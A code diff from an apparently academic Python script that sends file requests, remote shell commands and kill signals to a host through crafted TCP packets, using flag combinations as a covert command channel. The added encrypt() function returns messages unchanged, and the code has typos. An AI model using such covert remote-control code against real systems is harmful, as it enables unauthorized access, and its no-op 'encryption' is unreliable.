@@ -290,7 +290,7 @@ def sendFile(address, port, sFile):
 	print "Do stuff"
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215))/\
-	                raw(LOAD=sFile)
+	                raw(LOAD=encrypt(sFile))
 	send(commandPacket, verose=0)
 
 '''
@@ -318,7 +318,7 @@ def getFile(address, port, gFile):
 	print "Do stuff"
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="A")/\
-	                RAW(load=gFile)
+	                RAW(load=encrypt(gFile))
 	send(commandPacket, verose=0)
 
 '''
@@ -347,7 +347,7 @@ def terminal(address, port, command):
 	print "Do stuff"
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="S")/\
-	                RAW(load=command)
+	                RAW(load=encrypt(command))
 	send(commandPacket, verose=0)
 
 '''
@@ -376,7 +376,7 @@ def notify(address, port, notice):
 	print "Do stuff"
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="AS")/\
-	                RAW(load=notice)
+	                RAW(load=encrypt(notice))
 	send(commandPacket, verose=0)
 
 '''
@@ -404,6 +404,29 @@ def kill(address, port):
 	commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 	                TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="F")
 	send(commandPacket, verose=0)
+
+'''
+---------------------------------------------------------------------------------------------
+-- 
+-- FUNCTION: encrypt
+-- 
+-- DATE: 2014-11-14
+-- 
+-- DESIGNERS: John Payment
+-- 
+-- PROGRAMMER: John Payment
+-- 
+-- INTERFACE: encrypt(message)
+--              message - The message to be encrypted or decryped
+-- 
+-- RETURNS: N/A
+-- 
+-- NOTES: 
+-- 
+---------------------------------------------------------------------------------------------
+'''
+def encrypt(message):
+	return message
 
 main()
 
